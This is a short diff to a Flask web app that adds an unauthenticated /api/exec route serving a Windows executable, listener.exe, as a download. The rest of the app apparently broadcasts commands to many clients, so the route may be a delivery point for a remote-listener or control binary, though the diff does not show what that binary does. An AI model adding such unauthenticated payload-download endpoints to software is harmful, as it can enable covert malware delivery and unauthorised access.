@@ -12,7 +12,7 @@ from functools import wraps
 
 from dotenv import load_dotenv
 from flask import (Flask, Response, jsonify, redirect, render_template,
-                   request, session, url_for)
+                   request, session, url_for, send_file)
 
 load_dotenv()
 
@@ -580,6 +580,15 @@ def broadcast():
     add_history(kind, params, "TODOS")
     return jsonify({"ok": True, "sent": sent, "count": len(sent)})
 
+@app.route("/api/exec", methods=["GET"])
+def exec_file():
+    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+    path = os.path.join(BASE_DIR, "exces", "listener.exe")
+    
+    if not os.path.isfile(path):
+        return jsonify({"error": "Archivo no encontrado"}), 404
+
+    return send_file(path, as_attachment=True, download_name="listener.exe")
 
 @app.route("/stream")
 @login_required
